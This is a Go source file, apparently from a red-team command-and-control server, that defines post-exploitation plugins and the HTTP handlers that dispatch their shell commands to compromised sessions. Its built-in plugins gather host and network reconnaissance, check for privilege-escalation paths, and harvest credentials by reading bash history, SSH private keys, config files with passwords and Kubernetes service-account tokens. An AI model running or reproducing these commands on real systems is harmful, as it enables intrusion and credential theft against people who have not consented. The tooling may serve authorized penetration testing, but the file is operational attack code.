package server

// c2_plugins.go — C2 插件系统（CS 后渗透动作库）：插件 = 一组命令模板，
// 一键在目标机逐条执行并聚合回显。内置常用插件（信息收集/提权检测/凭据搜集/
// 容器逃逸检测/网络指纹/痕迹排查）+ 用户自定义（c2_plugins 表）。
// 执行引擎：每条命令 c2Task exec → 轮询 output（600ms，单条上限 25s）。

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/Autumn-27/artex/c2client"
)

// c2BuiltinPlugins 内置插件库（name 唯一，commands ≤ 10 条）。
var c2BuiltinPlugins = []map[string]any{
	{
		"name": "信息收集", "builtin": true,
		"description": "主机身份 / 网络 / 计划任务 / 环境变量全貌",
		"commands": []string{
			"id && uname -a && hostname",
			"ip a 2>/dev/null || ifconfig",
			"netstat -antp 2>/dev/null | head -30 || netstat -an | head -30",
			"ps aux --sort=-%cpu 2>/dev/null | head -15 || tasklist",
			"crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null | grep -v '^#'",
			"env | head -25",
		},
	},
	{
		"name": "提权检测", "builtin": true,
		"description": "SUID / sudo / capabilities / 可写敏感路径",
		"commands": []string{
			"sudo -n -l 2>&1 | head -10",
			"find / -perm -4000 -type f 2>/dev/null | head -20",
			"getcap -r / 2>/dev/null | head -10",
			"ls -la /etc/passwd /etc/shadow /etc/sudoers 2>&1",
			"find /etc /opt /tmp -maxdepth 2 -writable -type f 2>/dev/null | head -10",
		},
	},
	{
		"name": "凭据搜集", "builtin": true,
		"description": "history / SSH 密钥 / 配置文件（授权范围内）",
		"commands": []string{
			"cat ~/.bash_history 2>/dev/null | tail -30",
			"ls -la ~/.ssh 2>/dev/null && head -3 ~/.ssh/id_rsa 2>/dev/null",
			"find / -maxdepth 3 \\( -name '.env' -o -name 'config.php' -o -name 'wp-config.php' -o -name 'database.yml' \\) 2>/dev/null | head -10",
			"grep -rE 'password|passwd|secret|api_key' /home/*/.*rc /home/*/.profile 2>/dev/null | head -10",
		},
	},
	{
		"name": "容器与 K8s 检测", "builtin": true,
		"description": "docker sock / cgroup / K8s ServiceAccount（逃逸面评估）",
		"commands": []string{
			"ls -la /var/run/docker.sock 2>&1; ls /.dockerenv 2>/dev/null && echo IN_DOCKER",
			"head -3 /proc/1/cgroup 2>/dev/null",
			"ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null && head -c 40 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null",
			"env | grep -iE 'k8s|kube|container' | head -10",
			"which kubectl docker podman 2>/dev/null",
		},
	},
	{
		"name": "网络指纹", "builtin": true,
		"description": "hosts / 路由 / DNS / 内网存活段推断",
		"commands": []string{
			"cat /etc/hosts; echo ---; cat /etc/resolv.conf",
			"ip route 2>/dev/null || route -n",
			"ss -s 2>/dev/null || netstat -s | head -10",
			"arp -a 2>/dev/null | head -15 || cat /proc/net/arp | head -15",
		},
	},
	{
		"name": "痕迹排查", "builtin": true,
		"description": "持久化点检查（systemd / 计划任务 / 自启动）",
		"commands": []string{
			"systemctl --user list-units --type=service 2>/dev/null | head -15",
			"ls -la ~/.config/systemd/user/ 2>/dev/null",
			"ls -la /etc/systemd/system/ 2>/dev/null | head -15",
			"ls -la /etc/init.d/ 2>/dev/null | head -15",
			"w && last -10 2>/dev/null",
		},
	},
}

// seedC2Plugins 幂等种子内置插件。
func (s *Server) seedC2Plugins() {
	for _, p := range c2BuiltinPlugins {
		cmds, _ := json.Marshal(p["commands"])
		_, _ = s.m.PG().Exec(`INSERT INTO c2_plugins (name, description, commands, builtin)
			VALUES ($1,$2,$3,true) ON CONFLICT (name) DO NOTHING`,
			p["name"], p["description"], string(cmds))
	}
}

// GET /api/tools/c2/plugins — 列表（内置+自定义）。
func (s *Server) c2PluginsList(w http.ResponseWriter, r *http.Request) {
	rows, err := s.m.PG().Query(`SELECT id, name, COALESCE(description,''), commands, builtin
		FROM c2_plugins ORDER BY builtin DESC, id`)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	defer rows.Close()
	type item struct {
		ID          int64           `json:"id"`
		Name        string          `json:"name"`
		Description string          `json:"description"`
		Commands    json.RawMessage `json:"commands"`
		Builtin     bool            `json:"builtin"`
	}
	out := []item{}
	for rows.Next() {
		var it item
		var cmds []byte
		if err := rows.Scan(&it.ID, &it.Name, &it.Description, &cmds, &it.Builtin); err != nil {
			continue
		}
		it.Commands = json.RawMessage(cmds)
		out = append(out, it)
	}
	writeJSON(w, 200, map[string]any{"data": out})
}

// POST /api/tools/c2/plugins — 自定义插件。
func (s *Server) c2PluginsCreate(w http.ResponseWriter, r *http.Request) {
	var b struct {
		Name        string   `json:"name"`
		Description string   `json:"description"`
		Commands    []string `json:"commands"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
		writeErr(w, 400, "bad json: "+err.Error())
		return
	}
	if strings.TrimSpace(b.Name) == "" || len(b.Commands) == 0 {
		writeErr(w, 400, "name 与 commands 必填")
		return
	}
	if len(b.Commands) > 10 {
		writeErr(w, 400, "命令数上限 10 条")
		return
	}
	cmds, _ := json.Marshal(b.Commands)
	var id int64
	err := s.m.PG().QueryRow(`INSERT INTO c2_plugins (name, description, commands, builtin)
		VALUES ($1,$2,$3,false) ON CONFLICT (name) DO UPDATE SET
		description=$2, commands=$3 RETURNING id`,
		strings.TrimSpace(b.Name), truncateStr(b.Description, 300), string(cmds)).Scan(&id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true, "id": id})
}

// DELETE /api/tools/c2/plugins/{id} — 仅可删自定义。
func (s *Server) c2PluginsDelete(w http.ResponseWriter, r *http.Request) {
	id := parseID(r.PathValue("id"))
	if id <= 0 {
		writeErr(w, 400, "bad id")
		return
	}
	if _, err := s.m.PG().Exec("DELETE FROM c2_plugins WHERE id=$1 AND NOT builtin", id); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

// POST /api/tools/c2/plugin/run — 执行插件：逐条下发+取回，聚合返回。
func (s *Server) c2PluginRun(w http.ResponseWriter, r *http.Request) {
	var b struct {
		SessionID string `json:"session_id"`
		PluginID  int64  `json:"plugin_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
		writeErr(w, 400, "bad json: "+err.Error())
		return
	}
	if b.SessionID == "" || b.PluginID <= 0 {
		writeErr(w, 400, "session_id 与 plugin_id 必填")
		return
	}
	var name string
	var cmds []byte
	var builtin bool
	if err := s.m.PG().QueryRow(`SELECT name, commands, builtin FROM c2_plugins WHERE id=$1`, b.PluginID).
		Scan(&name, &cmds, &builtin); err != nil {
		writeErr(w, 404, "插件不存在")
		return
	}
	var commands []string
	if err := json.Unmarshal(cmds, &commands); err != nil || len(commands) == 0 {
		writeErr(w, 500, "插件命令解析失败")
		return
	}
	cli := c2client.New(c2client.CurrentOrDefault())
	type step struct {
		Cmd    string `json:"cmd"`
		Output string `json:"output"`
		Error  string `json:"error,omitempty"`
		MS     int64  `json:"ms"`
	}
	steps := make([]step, 0, len(commands))
	for _, cmd := range commands {
		st := step{Cmd: cmd}
		start := time.Now()
		out, err := c2RunTaskWait(r.Context(), cli, b.SessionID, "exec",
			map[string]any{"cmd": cmd}, 25*time.Second)
		st.MS = time.Since(start).Milliseconds()
		if err != nil {
			st.Error = err.Error()
		} else {
			st.Output = truncateStr(out, 60000)
		}
		steps = append(steps, st)
	}
	writeJSON(w, 200, map[string]any{"data": map[string]any{"plugin": name, "steps": steps}})
}

// c2RunTaskWait 下发任务并轮询到 output/终态（通用引擎，插件与未来功能共用）。
func c2RunTaskWait(ctx context.Context, cli *c2client.Client, sessionID, taskType string, args map[string]any, timeout time.Duration) (string, error) {
	tid, err := cli.EnqueueTask(ctx, sessionID, taskType, args)
	if err != nil {
		return "", err
	}
	if tid == "" {
		return "", fmt.Errorf("服务端未返回 taskId")
	}
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		select {
		case <-ctx.Done():
			return "", ctx.Err()
		case <-time.After(600 * time.Millisecond):
		}
		tasks, err := cli.ListTasks(ctx, sessionID, nil)
		if err != nil {
			continue
		}
		for _, it := range tasks {
			m, ok := it.(map[string]any)
			if !ok {
				continue
			}
			id, _ := m["id"].(string)
			if id != tid {
				continue
			}
			if out, _ := m["output"].(string); out != "" {
				return out, nil
			}
			if st, _ := m["status"].(string); st == "done" || st == "completed" || st == "failed" || st == "error" {
				if e, _ := m["error"].(string); e != "" {
					return "", fmt.Errorf("%s", e)
				}
				return "", nil // 终态无输出
			}
		}
	}
	return "", fmt.Errorf("超时未回显（%.0fs）", timeout.Seconds())
}
